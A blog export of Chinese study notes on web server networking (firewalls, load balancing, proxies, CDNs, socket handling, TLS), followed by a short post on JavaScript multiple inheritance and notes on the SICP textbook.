服务器端的局域网中有什么玄机Web 服务器的部署地点在公司里部署 Web 服务器 Web 服务器上面通常会安装很多软件，如果某个软件存在安全漏洞，就会导致服务器受到攻击，但其实大部分服务器上的软件并不对外提供服务；因此，通过引入防火墙，只允许访问特定软件的数据包通过，这样就可以避免服务器受到某个软件漏洞的影响； 目前仅靠防火墙已经不够用了，还需要配合反病毒软件、非法入侵检测软件、访问隔离机制等多套方案，才能有效提高安全性； 将 Web 服务器部署在数据中心由于数据中心离 IX 很近，因此可以让服务器获得更快的访问速度。同时由于数据中心通常还提供各种增值服务，因此一般也更加安全； 防火墙的结构和原理主流的包过滤方式防火墙的作用是只允许满足条件的流量通过，实现这个目标有很多种方案，但简单和低成本的方案是使用包过滤的方式； 如何设置包过滤规则由于数据包的头部包含一些关键的信息，因此可以基于这些头部信息制作相应的规则来实现包过滤； 上图的例子中，通过加入 TCP 包的控制位规则，实现 Web 服务器无法发起对互联网的访问，而只能响应客户端的请求； 通过端口号限定应用程序通过在规则中增加端口号，就可以实现只允许特定应用程序被外部访问；因为端口号映射着绑定该端口号的应用程序； 通过控制位判断连接方向TCP 头部中的控制位可以用来判断包的方向，因为在建立 TCP 连接时，发起的第一个数据包中的控制位为 SYN&#x3D;1 和 ACK&#x3D;0，后续的其他包的控制位都不再是这个组合。因此通过限制该组合的出现，就可以阻止建立 TCP 连接； 控制位只能适用于 TCP 连接，而其他连接协议（如 UDP）则不适用，因为 UDP 头部都没有这些控制位；这个时候要么妥协，要么需要增加其他防火墙方案，而不能只使用包过滤机制； 从公司内网访问公开区域的规则仅在发送方的 IP 地址为公司内网的 IP 地址时，才允许通过； 想到了访问后台时，可以临时添加 IP 地址来实现访问；先在内网中设立一个专用的后台程序来暴露接口。由于该程序处于内网，因此可以访问主程序的敏感接口；然后只允许特定 IP 访问该后台程序； 通常来说，内网的计算机分配的是私有 IP 地址，当访问外网时，路由器需要对其作地址转换。但内网之间的访问，则不需要地址转换，此时可以在路由器中配置相应的规则，让内网中的计算机对公开区域的访问，仍然使用私有地址； 从外部无法访问公司内网如果路由器没有地址转换的映射记录，当收到外网发进来的包时，由于不知道应该转发给哪台内网设备，路由器默认会丢弃该数据包； 通过防火墙使用防火墙软件时，可考虑开启包丢弃日志，这样可以分析入侵者的攻击方法；路由器由于内置存储很小，一般不适合开启日志功能； 防火墙无法抵御的攻击服务器程序本身的 BUG 引发的安全漏洞，是无法使用包过滤来规避的。常规的方法是增加部署检查包内容的软件或硬件；但这种方法的效力也是有限，因为某个包是否安全，是由服务器程序本身是否存在 BUG 来决定的，而这种 BUG 在早期是未知的，因此包检查软件也难以判断该数据包是否安全； 通过将请求平均分配给多台服务器来平均负载性能不足时需要负载均衡负载均衡可以有多种方案，最简单的方案是使用 DNS；在设置 DNS 解析时，新增多条相同域名的解析记录，每一条对应一个不同的 IP 地址；这样每次查询 DNS 时，DNS 服务器都会返回所有地址，但不同的地址顺序； 虽然 DNS 机制最简单，但是它也有一些缺点，例如： 当某台服务器宕机时，DNS 服务器无法知晓，仍然会给客户端返回宕机的服务器 IP 地址；除非客户端在发现第一个地址无效时，会自动访问第二个 IP 地址（多数浏览器已经实现该功能）； 当多台服务器时，如果用户的某个会话信息存储在其中一台服务器上面，之后用户访问另外一台服务器时，会导致会话丢失； 使用负载均衡器分配访问负载均衡的另外一种方案是使用专门的负载均衡器；DNS 解析指向该负载均衡器，当客户端访问负载均衡器时，会负载均衡器判断应该将包转发给哪台服务器； 负载均衡器会根据服务器当前的负载情况来转发包，有多种判断办法，例如： 定期查询服务器的 CPU 和内存使用情况； 根据服务器的性能参数按比例转发； 会话亲和性； 如果需要让负载均衡器将某个客户端请求固定转发到特定的机器上面，一般会使用 HTTP 的 cookie 字段作为判断；其原理很简单，当某个客户端首次访问时，负载均衡器为其分配一个唯一的 cookie 值，并记录映射的服务器；之后客户端的请求都需要携带该 cookie 值，这样负载均衡器就可以通过查询映射表，将请求转发给固定的服务器； 使用缓存服务器分担负载如何使用缓存服务器负载均衡可以有两种思路，这种思路可以单独使用，也可以组合使用： 使用多台功能相同的服务器：每台服务器分担的请求变少； 使用多台功能不同的服务器：每台服务器分担的工作内容变少 缓存服务器通过更新时间管理内容缓存服务器需要前置在 Web 服务器之前先处理请求，如果没有负载均衡器，那么缓存服务器需要直接注册到 DNS 解析记录中； 当客户端首次访问某个资源时，缓存服务器没有命中缓存，会直接将请求转给 Web 服务器，之后缓存 Web 服务器返回的结果；当客户端下次再访问相同资源时，缓存服务器在转发请求时，会在头部增加 If-Modified-Since 字段，用来沟通该资源是否发生了变更； 最原始的代理–正向代理缓存服务器的方案最早其实是部署在客户端的（公司），而不像现在部署在服务端。当时客户端的缓存服务器是为了实现防火墙，然后在此过程中发现还可以顺便充当缓存服务器，因为当时的网速很慢，因此使用缓存服务器可以有效提高访问速度；另外公司还可以利用该机制，控制员工可访问的网站列表，避免访问危险的网站； 后来由于出现了多种多样的代理方案，不同方案之间为了相互区分，因此才有了正向代理（forward proxy）、反向代理（reverse proxy）之类的名称； 当在浏览器中开启代理功能时，浏览器发送出去的请求会有所不同，主要区别如下： 没有代理 请求发往目标网站所在的服务器； HTTP 报文的 URI 只有路径，没有域名； 有代理 请求发往代理服务器； HTTP 报文的 URI 包含完整的域名和路径； 正向代理的改良版–反向代理由于使用正向代理要求用户修改浏览器配置，比较麻烦而且容易出错导致浏览器无法正常工作。因此改进的办法是将缓存服务器部署到服务端，将 HTTP 报文中的 URI 和目标 Web 服务器进行关联（因为 HTTP 1.0 版本没有 Host 字段），这样就可以得到完整的网站，从而能够转发任意消息。为了跟传统的前端代理以示区别，这种方式称为反向代理（reverse proxy）； 透明代理正向代理需要配置浏览器，反向代理需要配置服务器，二者才能正常工作；还有一种方案是根据数据包中 IP 头部来判断转发目标，这样就既不需要配置服务端，也无须配置浏览器，同时还获得了各自的优点； 由于透明代理作为中间人在工作，因此它必须知道最终访问的目标 IP 地址，而不能让自己像反向代理一样成为被访问目标，否则数据包中的最终目标 IP 地址就变成它自己了（貌似可以通过域名再次查询出来？）；为了实现透明代理的功能，透明代理需要放置于数据包发出方和接收方之间的传输线路上面； 内容分发服务利用内容分发服务分担负载如果将缓存服务器放在服务端，那么它可以减轻后端 Web 服务器的负担，提高后端这一段的访问速度，但由于所有的用户流量仍然会到达缓存服务器，因此它无法避免网络传输线路上存在的堵塞； 如果缓存服务器由用户自己部署在客户端，那么它可以很好的避免网络上的堵塞，但是 Web 服务器无法控制客户端缓存服务器中的内容； 第三种方案就是将缓存服务器放在互联网的边缘（即客户端所在的运营商机房），这样客户端在进入堵塞区域之前，能够先到达运营商机房内部的缓存服务器，既提高了客户端的访问速度，也减轻了服务端的负担，同时服务端也能够控制缓存服务器上面的内容； 单个 Web 服务器的运营者跟运营商签合同的话，费用成本很高，因此出现了专门的第三方，他们和主要的几家运营商签合同，之后再租借给单个的 Web 服务器运营者，实现三赢；这种模式称为内容分发服务； 如何找到最近的缓存服务器 寻找最近的缓存服务器有多种方案，其中一种是使用 DNS；大致原理如下： Web 服务器注册的 DNS 服务器先收集好各缓存服务器的路由信息； 当收到客户端发出的 DNS 解析请求时，基于上一步的路由信息，判断客户端到哪台缓存服务器的路径最短，并返回结果； 通过重定向服务器分配访问目标另外一种寻找最近缓存服务器的方法是添加重定向服务器，并将其添加到 DNS 解析记录中；这样当客户端发起请求时，数据包先到达重定向服务器，之后重定向服务器基于提前收集好的路由信息，判断最近的缓存缓存器，并存储在 HTTP 响应头部中的 Location 字段。客户端在收到该响应后，会向 Location 中的缓存服务器地址，发起一个新的连接； 缓存的更新方法会影响性能缓存机制最早是被动式的，首次收到请求后，发现缓存中没有数据，因此向 Web 服务器请求资源；后续的请求则每次询问 Web 服务器资源是否变更，若没有变更，则返回缓存中的内容；这种被动式的缓存有两个缺点，一是首次访问较慢，二是后续的每次查询仍然会给 Web 服务器带来一定的负担； 更好的办法是使用主动式的缓存，它的原理是当 Web 服务器上面的内容有变更时，就通知缓存服务器更新。这种方法可以避免后续 Web 服务器收到大量关于资源是否变更的询问； 请求到达 Web 服务器，响应返回浏览器服务器概览客户端与服务器的区别客户端与服务器并没有本质上的区别，都是计算机，唯一的区别是服务器要先做好开门候客的动作（在没有客户端请求到达之前，需要先创建好套接字并进入待连接状态；而客户端只需要发起连接前，再临时创建套接字即可）；因为在 TCP 协议的设计中，必须有一方处于待连接的状态，连接才有可能建立； 虽然在本质上没有不同，但所使用的硬件型号一般有所区别，服务器的使用场景有两个关键特点，一个是并发量高，需要应付很多客户端的访问；二是需要长时期的稳定运行。为了满足这两种需求，一般服务器的 CPU 核数更多，但单核性能不高；内存更大，而且带校验机制，但内存性能较低；通常不配备显卡，网卡比较多，可拓展更多的硬盘，以满足存储需求； 服务器程序的结构服务端要应付多个客户端发起的连接请求，因此服务端会给每个请求创建一个单独的套接字；大概过程如下： 当服务端创建完第一个套接字后，先进入监听状态和等待连接的状态；之后如果有新的客户端连接请求到达，它就会复制一个套接字副本出来（使用新的文件描述符），并将客户端的控制信息填写到副本里面，而旧的套接字内容保持不变，并继续处于待连接状态，以便应付新的客户端请求；当有多个客户端同时连接服务端时，就会存在多个套接字副本，更有意思的是，它们都绑定到相同的端口号； 协议栈会维护一张套接字映射表，通过四项信息的组合，来识别接收到的数据包到底是属于哪个套接字，这四项信息分别是客户端IP+客户端端口+本机IP+本机端口；根据这四项信息，通过查找映射表，就知道当前的数据包是属于哪个套接字了； 而对于应用程序来说，是通过文件描述符来跟套接字打交道的；多个套接字副本，意味着有多个文件描述符；当某个文件描述符进入就绪状态后，它会发起一个中断，之后操作系统会通知应用程序，并将控制权转移给应用程序进行处理； 特别注意：套接字跟端口可以是多对一的关系，协议栈会维护一张映射表，根据数据包中的头部信息判断，该数据包隶属于哪个套接字负责；每个套接字中存储着不同的连接信息； 以前在学 《深入》和 C 语言时，由于 socket 初始化后，总是有一个 bind 的动作，误以为套接字和端口是一对一的关系，现在才发现其实不是；以前没有留意到 accept 动作会返回新的套接字，回头看了一下笔记，才发现当时写的是描述符，因此没有意识到 accept 返回的新描述符背后，其实是一个新的套接字； 服务器端的套接字和端口号服务端的应用程序大致可以划分为两个模块： 负责建立连接的模块，即下图的连接模块； 负责生成响应的模块，即下图的通信模块； 调用 accept 并不会马上返回新的套接字，在客户端的请求没有到达之前，它其实是进入阻塞的状态，要一直等到客户端的请求进来后，才会返回新套接字；该新套接字其实不是从头新建的，而是复制旧套接字并进行补充客户端连接信息后而来的； 当出现多个套接字对应同一个端口号时，为避免混乱，协议栈必须维护一张映射表，以便知悉哪个客户端请求对应的是哪个套接字； 服务器的接收操作网卡将接收到的信号转换成数字信息网卡收到电信号后： 先根据规范约定的波形判断出头部的位置， 从头部中读取到时钟周期 基于该时钟周期，从原始被发送方叠加过时期周期的电信号中，分离出原始信号； 将原始信号转换成 0 和 1 表示的数字信号； 根据规范，从数字信号末尾读取校验值； 计算解析后的数字信号的校验值，看是否跟收到的校验值一致； 若不一致，丢弃该数据包； 若一致，检查头部中的 MAC 值是否跟当前网卡的 MAC 值一致； 若不一致，丢弃该数据包； 若一致，将数字信号放到缓存中，触发中断事件，以便 CPU 介入，并将控制权转移给网卡驱动程序； 网卡驱动程序读取缓存中的数据，根据 MAC 头部判断使用何种协议；然后触发中断事件，以便 CPU 介入，并将控制权转给相应的协议栈进行处理； IP 模块的接收操作IP 模块收到数据包后的动作： 检查 IP 头部中的目标 IP 地址，判断该包是否发给自己； 若不是，则根据情况（是否开启转发功能）转发该数据包； 若是，检查是否分片；若有分，则等待所有分片到达后组装它们； 组装好后，检查头部中的协议号字段，看使用何种协议，并转交给相应的协议模块（如 TCP ）进行处理； TCP 模块如何处理连接包TCP 模块收到 IP 模块转交的数据后： 检查头部中的端口号字段，看有无套接字在监听该端口号； 若没有，发送一条 ICMP 消息给客户端告知错误（黑客可基于该条规则对端口号进行扫描，了解有哪些端口号处于监听状态）；如果有，继续往下； 检头部中的控制位 SYN，如果值为 1，表示这个一个尝试建立连接的控制包；复制一份当前监听访端口的套接字，写入客户端相关信息（如客户端的 IP 地址、端口号、窗口大小、序列起始值等）；然后生成包含己方连接信息的控制包，转交给 IP 模块处理发出去； TCP 模块如何处理数据包如果 TCP 头部中的控制位没有值，则说明当前包是一个数据包，而不是连接控制包，动作如下： 判断该数据包属于哪个套接字处理，判断办法基于接发双方的 IP 地址和端口号四项信息即可； 根据套接字中保存的信息，了解之前已收到第几个序列号的包，以及当前包的序号是否能够连上，以便后续可以将各个分包组装成完整的数据；若可连上，将数据放入缓冲区； 每隔一小段时间，发送 ACK 控制信息给客户端，告知某个序号以前的包已经收到了； 收到所有包后，触发中断事件，CPU 介入，通知应用程序来读取数据； TCP 模块的断开操作当收到完整的数据包之后，连接就可以断开了，断开动作可以由客户端发起，也可以由服务端发起； HTTP 1.0，规定由服务端发起； HTTP 1.1，规定由客户端发起； Web 服务器程序解释请求消息并作出响应将请求的 URI 转换为实现的文件名对于静态资源的访问，请求中的 URI 通常会映射到服务器上面某个目录中的某个文件， 只需提前在服务器程序中进行配置好可；文件名可以一一对应，也可以不一样，然后通过配置好的改写规则进行映射即可； 运行 CGI 程序对于动态资源的访问，一般 URI 会被映射给某个符合 CGI 标准的程序文件；当访问该 URI 时，就会委托操作系统运行相应的 CGI 程序文件，此时会将 HTTP 请求报文的内容作为参数传递给该 CGI 程序； 传统的 CGI 程序在运行结束后，会生成 HTML 格式的内容作为响应消息，现在则衍生出了很多种格式，例如 XML，JSON 等格式；之后将响应内容交给服务器模块发送给客户端，服务器模块不会修改内容，但有时会添加一些头部字段； Web 服务器的访问控制如果某些资源限制访问，当收到访问这些限制资源的请求时，需要验证用户的身份，以检查是否满足访问条件，常用的办法是使用用户名和密码，偶尔会使用客户端的 IP； 返回响应消息返回响应消息的过程跟发出消息的过程差不多，只是反过来而已； 浏览器接收响应消息并显示内容通过响应的数据类型判断其中的内容浏览器在收到服务器返回的消息后，需要先根据头部的 content-type 字段判断一下消息的类型，以便能够正常显示它们；常见的消息类型有 text、image、audio、video、application、multipart（复合类型）等；例如： Content-Type: text&#x2F;html; charset&#x3D;utf-8，text 表示主类型为文本，斜杠右边的 html 表示子类型，charset 表示编码方式； 另外为了提高传输速度，数据有可能被压缩了，此时可以根据头部的 Content-Encoding 字段了解使用的压缩方式，然后进行解压； 浏览器显示网页内容有些数据类型如 HTML、图片是浏览器能够直接显示的，有些浏览器显示不了的数据类型，就会调用相应的应用程序来处理数据； 其他TSL 连接过程单向认证 客户端：发起问候，告知服务端自己所支持的协议和加密套件，以及客户端生成的随机数； 服务端：发起问候，告知客户端自己的 SSL 公钥以及相应的签发机构，所支持的协议和加密套件，以及服务端生成的随机数； 客户端：用证书机构的公钥，验证服务端的 SSL 公钥是否和所访问的域名一致；若不一致，结束；若一致，下一步； 客户端：生成第二个随机数（称为 premaster secret），使用服务端的公钥加密后，发给服务端； 服务端：用私钥解密收到的数据，得到 premaster secret，加上之前双方各自生成的两个随机数，共三个随机数，使用加密套件生成会话密钥；使用会话密钥，加密“已完成”的消息，发给客户端，告知对方自己就绪； 客户端：同样使用三个随机数生成会话密钥，加密“已完成”的消息，发给服务端，告知对方自己就绪； 双方完成握手； 双向认证双向认证与单向认证的唯一不同点在于第4步，客户端在发送 premaster 时，还会同时附上自己的公钥证书，以及将之前双方的随机字符串使用自己的私钥进行加密并发送，这样服务端收到该公钥证书，使用 CA 可以进行验证；如果有问题，中断通信，握手失败；如果没问题，后续跟单向认证相同，即开始用自己的私钥解密得到 premaster，然后使用加密套件计算出会话密钥； 非对称密钥 使用 openssl 等工具，可以生成非对称密钥，即一把公钥和一把私钥，其中一把加密后的内容，可以由另外一把解密； 所谓的证书，是指使用权威 CA 机构的私钥，对公钥拥有者（例如域名）和公钥本身进行加密后，生成的内容；由于 CA 机构的公钥是公开的，因此任何人都可以使用 CA 机构的公钥对证书进行解密，解密后就可以验证其中的内容（公钥+公钥所有者的身份信息），例如域名是否为预期想访问的网站域名；如果是，说明该证书是有效的； 权威机构在受理证书申请时，需要验证申请人的身份信息，例如申请网站的域名证书时，就需要验证该域名是否真的被申请人持有；Let’s Encrypt 的方法是生成两个随机字符串，一个做为域名的访问路径，然后发起对该路径的访问，看访问结果是否为另外一个随机字符串；如果是，说明域名确实由申请者所拥有，因为申请者能够将字符串添加到访问路径和访问结果中；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"网络","slug":"网络","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"js多重继承","slug":"js 多重继承","date":"2017-11-12T08:46:48.000Z","updated":"2024-09-21T23:15:05.965Z","comments":true,"path":"2017/11/12/js 多重继承/","permalink":"http://example.com/2017/11/12/js%20%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF/","excerpt":"","text":"方法一：克隆一个A对象，再将 B 对象的属性混入，适用于 A&#x2F;B 的属性不冲突的场景；12345678910function mixInto(object, mixIn)&#123; forEachIn(mixIn, function(name, value)&#123; object[name] = value; &#125;);&#125;;var SmallDetailedItem = clone(DetailedItem);mixInto(SmallDetailedItem, SmallItem);var deadMouse = SmallDetailedItem.create(&quot;Fred the mouse&quot;, &quot;he is dead&quot;); 方法二：用 A 对象扩展一个子对象，再用 B 对象 扩展并覆盖子对象中的冲突属性；1234567891011121314151617181920212223242526272829var Monster = Item.extend(&#123; construct: function(name, dangerous)&#123; Item.construct.call(this, name); this.dangerous = dangerous; &#125;, kick: function()&#123; if (this.dangerous)&#123; alert(this.name + &quot; bites your head off&quot;); &#125; else&#123; alert(this.name + &quot; squeaks and runs away&quot;); &#125; &#125;&#125;);var DetailedMonster = DetailedItem.extend(&#123; construct: function(name, description, dangerous)&#123; DetailedItem.construct.call(this, name, dangerous); Monster.construct.call(this, name, dangerous); &#125;, kick: Monster.kick&#125;);var giantSloth = DetailedMonster.create( &quot;the giant sloth&quot;, &quot;it is quietly hanging from a tree, munching leaves&quot;, false); giantSloth.kick();","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"计算机的程序构造和解释 SICP","slug":"计算机的程序构造和解释 SICP","date":"2017-10-22T08:42:00.000Z","updated":"2024-09-22T23:10:28.490Z","comments":true,"path":"2017/10/22/计算机的程序构造和解释 SICP/","permalink":"http://example.com/2017/10/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%A8%8B%E5%BA%8F%E6%9E%84%E9%80%A0%E5%92%8C%E8%A7%A3%E9%87%8A%20SICP/","excerpt":"","text":"构造过程抽象 程序设计的基本元素 总述 基本表达形式：简单的元素 组合的方法：由简单元素组合到复合元素 抽象的方法：为复合元素命名，作为独立单元进行操作； 表达式：将表达式用括号包起来，形成了组合式，左侧是前缀的运算符，右侧是运算对象；运算符背后代表一种过程，它也是过程的一种抽象；运算对象背后代表一个值； 命名和环境 命名：获得通过名字去使用计算对象的方法，简化细节，其实这也是一种最基本的对计算过程的抽象； 环境：一种存储的能力，实现名字-值的对偶关系的追溯；用于确定表达式中各个符号所代表的意义； 组合式的求值 求值规则： 先对子表达式进行求值，其次将最左子表达式作为过程，右侧子表达式的结果做为运算对象，再次进行求值；（这个过程不断调用规则本身，本质上是一种递归的思想） 由通用规则和一些特殊形式的规则组成；而事实上，特殊形式的规则也不过是对一些通用规则的封装，更便于使用和理解，即语法糖（据说语法糖太多也不好，会增加复杂性）； 递归：一种处理层次性结构的好办法； 复合过程 对复合操作的一种抽象，用一个名字来表示这种复合的操作； 过程应用的代换模型 正则序：先展开而后归约（展开：先用表达式去替换参数，而不是先对参数进行求值；一直等到需要的时候，再去对表达式求值；如果因为某些条件判断导致一直没有需要，则此表达式不求值）（听起来像是惰性求值的样子） 应用序：先求值参数而后应用 实际上，解释器并不是通过“代换”参数的形式在工作，而是通过“局部环境”来取得相同的效果；（估计是在不同的局部环境中切换） 条件表达式和谓词 (cond ( ) ( )…( )； 如果所有条件都不为真，则 cond 没有值 最后一个条件可以用 else 来表示永远为真，这样最后一个 总是会被执行； if 是 cond 的特殊形式，只适用于只有两个条件的情景下； and, or, not and 和 or 不是普通过程，因为它的子表达式不一定会求值，它们是一种特殊形式（或许可以理解为它们是一种复合过程，对普通过程进行了封装）； not 是普通过程； 过程作为黑箱抽象 局部名：如果一个名字，只能在它所在的那集表达式中使用，称为名字的作用域； 内部定义和块结构：一种局部环境的思想，涉及词法作用域的理念，即名字只在定义这个过程的局部环境中去寻找； 过程与它们所产生的计算 总述： 看清各种不同种类的过程，会产生什么样的计算过程； 计算过程会以不同的速度消耗各种重要的计算资源（时间和空间）； 线性的递归和迭代 递归：由一个个推迟进行的操作所构造起来的链条； 迭代：可以用固定数目的状态变量进行描述的计算过程（优点：空间资源相对消耗少）； 递归计算过程和递归过程表达的是不同的意思，前者表示某个计算过程是由一个个推迟进行的操作所构成的链条，是一种计算的进展方式；后者表示某个过程定义，引用了过程本身； 尾递归：它是一个递归过程，会调用自身，但是它只在常量空间里执行迭代计算，即空间消耗没有变化； 树形递归 好处：程序容易理解和设计 坏处：可能开销很大，存在很多冗余计算（一种常用的解决方式叫动态编程，即将过程中的计算结果存储下来，每次新的计算，优先查找已存储的历史结果，如果没找到，再进行计算） 增长的阶 O(n)：读 theta n，用来计算当 n 变化时，所需消耗的资源量的一个粗略估算值； 求幂 设计一个变量，让它在迭代过程中记录结果，并带入下一个迭代，从而实现尾递归，常用于设计迭代算法； 用高阶函数做抽象 过程作为参数 将某种公用模式的计算过程，抽象为一个函数，此函数接受其他函数做为参数，并将其他函数的值，用已抽象好的计算过程去求值； 用 lambda 构造过程 lambda 表达式可以直接作为另外一个表达式的过程前缀，跟常规的用名称来表示过程是一样的效果；即：( lambda ) let 可以用来创建局部变量，使用效果上跟 define 来创建变量是一样的；let 表达式更多是做为 lambda 的语法外衣，使得代码更容易阅读和理解； ( let ( ( ) ( )) ) let 让我们可以在接近局部变量使用的地方创建变量，这样更进一步方便代码的阅读理解； let 定义的变量的表达式所用到的变量的值，是在 let 外面计算的； 过程作为一般性的方法 用来表述一般性的一个计算过程，与其中涉及的特定函数无关； 通过区间折半寻找方程的根 假设 f 是一个连续的函数 对于给定的 a 和 b ，存在 f(a) &lt; 0 &lt; f(b) 那么存在一个点 k，使得 f(k) &#x3D; 0； 找出函数的不动点 如果存在 f(x) &#x3D; x 则 x 称为函数 f 的不动点（将 x 做为参数代入函数 f 进行计算后，结果仍然得到 x ，所以叫做不动点？） 平均阻尼技术：取逼进一个解的一系列值的平均值的方法；常常用于不动点的搜寻场景，可以用来帮助收敛； 寻找不动点的用途，貌似这种技术可以做为一些函数的解法，比如求平方根，求立方根，它内在的本质，貌似也可以算是一种收敛性的猜测，即给出一个猜测值，然后根据结果缩小猜测范围的猜测下一个值，为避免出现例外情况，此处引入平均阻尼的方法（如果没有引入平均阻尼的方法，不动点技术不一定在空间上有太多优势，因为有可能它收敛的很慢，甚至振荡而不收敛，当然，貌似它也可能收敛的很快，但目测再快也没有平均阻尼快了；又想了想，好像也不一定）； 不动点技术是一种有趣有用的好技术，但不是所有的函数都存在不动点；如果一个函数没有不动点，则这个技术就不适用了； 过程作为返回值 当一个过程，需要以函数作为参数时；此时另外一个过程，其返回值是一个函数，那么这两个过程就可以进行组合了； 牛顿法：这又是一个神奇的方法，通过使用函数的导数，进行不动点的迭代，求得方程的根； 抽象和第一级过程 第一级元素的特权 可以用变量命名； 可以提供给过程作为参数； 可以由过程作为结果返回； 可以包含在数据结构中； scheme 给了过程第一级元素的状态，这使得 scheme 获得了强有力的描述能力；它的代价是，需要为过程中的自由变量保留空间，即使这一过程并不执行；这些变量被存储在过程的环境里；(说明过程是提前被存储起来的，猜测就像变量一样存储在内存常量区？答：是的，所有过程本质是都是一系列指令的集合，当它们被编译器转成机器指令时，需要占用内存空间，但根据条件不同，有时候不一定会跳转到该段位置执行指令） 构造数据抽象 数据抽象导引 本质：将数据的构造细节和使用方式进行分离； 好处：可以在程序中建立起抽象屏障，将“使用”数据对象的程序（上层）与“实现”数据对象的程序（下层）分开来； 示例，有理数的表示 (define (make-rat n d) (cons n d)) \\此处通过序对来表示有理数 (define (numer x) (car x)) \\基于上面序对的表示方式，定义了取得分子的过程； (define (denom x) (cdr x)) \\定义了取得分母的过程； 在有了上面三项之后，未来如果想要更改序对的表示方式，只要同时更新分子和分母的获取实现过程即可，但不改变 make-rat、numer、denom 的名称，这样就可以使得那些基于这三个名称构建出来的程序，完全不必修改，仍然可以正常工作； 思想： 构造出一些使用复合数据对象的程序，而不是基本数据对象，这样程序像是在“抽象数据”上操作一样；好处是建立了抽象屏障，底层数据构造细节的变化，不变影响到上层的程序；数据是如何构造出来的，跟数据是如何使用的无关（此处让我想起了面向对象编程中的对外暴露的方法，即访问一个对象的数据，是通过该对象的方法来获得，而不是直接访问对象的属性本身，这样其实也是实现了一种抽象和隔离，让未来对象数据结构的变化，带来的影响减至最小）； 为每一类数据对象标识出一组基本操作，使得针对这些数据对象的所有操作，都可以由这些基本操作来组成，并且也只用这些基本操作组成； 构造函数：用来构造数据对象； 选择函数：用来访问数据对象； 数据：由一组适当的构造函数和选择函数组成，以及它们必须满足的一组特定条件（以便使构造和选择过程可以成为合法的表示）（思考：貌似面向对象的思想，就是一种数据抽象封装的方式）（由此想到，对于对象的数据的访问方式，应该通过定义好的方法，而不应该通过对象的属性进行直接访问，因为这样缺少隔离的屏障，甚至不小心修改了对象的属性，很危险） 从序对构造起来的数据对象称为表结构数据（为什么叫做表结构数据呢？） 区间算术：由于区间表示的数本身具备一定的不确定性，即缺少唯一性的问题，所以，区间算术的运算，根据运算形式的不同，结果有可能不同；在一次运算过程中，不确定性变量出现的次数越多，最后结果所包含的不确定性就会越大。因此，如果能够通过算术变换，尽量减少不确定性变量的使用次数，那么结果会更加收敛； 层次性数据和闭包特性 闭包是指通过某个过程组合起来的数据对象结果，仍然可以使用相同的过程再进行组合；在代数术语中，它的意思是某个集合里面的元素，经过计算后，得到的结果，仍然属于这个集合； 序列： 定义：一批数据对象的一种有序组合； 实现的方式有很多种，通过嵌套的序对来实现是其中的一种方法； 通过嵌套的 cons 来实现的序列，称为一个表；它还可以使用关键字 list 来创建，这样写起来更方便一些；（list 是链表结构，其他还有数组结构，链表结构的优点是可以用O(1)实现更新和删除，但查找需要O(n)；而数组的方式，优点是查找只需要O(1)，但更新和删除是O(n)（如果使用哈希表呢？是否更新、删除、查找都是O(1)？）； 表： car 可以用来在表的前面增加一个元素，但不能用来在表后面增加元素；可以用 append 在表的后面增加元素，不过貌似要自己定义这个函数，没有内置；（注：append 是O(n)的成本） nil 可以用来表示序列链的结束，也可以用来表示一个空表； null? 它是 scheme 自带的一个函数，用来判断一个表是否为空表； 层次性结构：树，表中又包含表； 表的映射：(define (map proc items) … )， 用 car 逐项处理 items，并用 cons 将处理结果和剩下的 cdr items 递归处理结果进行连接；（这玩意儿看上去就是一个迭代的过程，好比 js 或 python 里面的 map 函数，简直一样样的）； 树的映射 方式一：分支判断，递归左分支和右分支；用 cons 连接递归结果； 方式二：(map lambda tree)，其实跟上面本质相同，只是将 cons 和递归抽象在 map 中，将处理抽象在 lambda 中 使用约定的接口 定义一些标准的部件库，这些部件定义约定的接口，以便部件之间能够相互灵活的连接，组合出更模块化的程序； 示例：例如枚举，映射，过滤，累加等几个函数，通过它们的组合，达到模块化的效果； 将程序操作转换为对序列的操作，然后只需依赖几个为数不多的序列，就可以实现复杂的操作效果； 嵌套映射：(define (flatmap proc seq)) ，用 map 做映射，然后用 append 对结果进行累积； 符号数据 eq? 用于判断两个符号是否相同； memq 判断某个符号是否在某个表中，如果不在，返回假；如果在，返回这个符号首次出现的位置余下的表； equal? 用于判断两个表是否相同； number? 用于判断某个变量是否为数字； symbol? 用于判断某个变量是否为符号； 代数表达式的表示：用符号组成的表来表示，并定义出加减乘除的方法，这样就可以在这个基础上进行符号计算了； element-of-set？ 用于判断给定元素是否为某个给定集合的成员； 集合的表示 集合为未排序的表：O(n^2)； 集合为已排序的表：O(n) 集合作为二叉树：O(log n) 集合与信息检索 定长编码：比较浪费空间； 变长编码：利用相对频度，改变符号在树中的位置，可以明显节约空间； Huffman 编码树 原则：最低频度的符号出现在离树根最远的地方； 算法：找出最低频度的两个符号，生成一个新节点，加入原集合中，去掉这两个符号；重复这个过程，直到处理完所有的符号； 表示： 叶子：(define ‘leaf symbol weight) 节点：(list left right symbols weight) 抽象数据的多重表示 显式分派风格 使用带标志的数据；选择函数首先检查参数的标志，然后对应寻找到处理这类数据的过程； (define (real-part z) (cond ((rectangular? z) 1. (real-part-rectangular (contents z)) ((polar? z) (real-part-polar (contents z))) 数据导向风格 将数据的不同表示方式和操作，加上标志，独立出来组成一个表格，形成一个包；当需要使用的时候，传入标志参数进行调用； 好处： 如果未来有新的方式，只需要在表格中进行注册即可；其他地方都可以不用更改； 表格中注册的每种方式，由于是各个标志进行内部的命名，作用域方面也不会存在冲突；这样可以最大程度的整合不同人员的不同表示方式； 消息传递风格 将数据对象做为一个实体，以消息的方式接收到所需操作的名字 (define (make-from-real-imag x y) (define (dispatch op) (cond ((eq? op ‘real-part) x) ……(略) dispatch))) 带有通用型操作的系统 通过数据导向的设计，将不同类型的操作放进包中； 包中的过程，可以引用已有的包，在其基础上进一步抽象，让它变得更加通用； 模块化、对象和状态 面向对象是一种设计策略，目的在于让程序更加健壮，易于拓展；相对于函数式的代换模型，它引入了环境模型，更加机械化，理论上更不容易把握，因为我们需要与时间做搏斗；流模型可以解决与时间的冲突，它通过延迟求值的方式实现； 赋值和局部状态 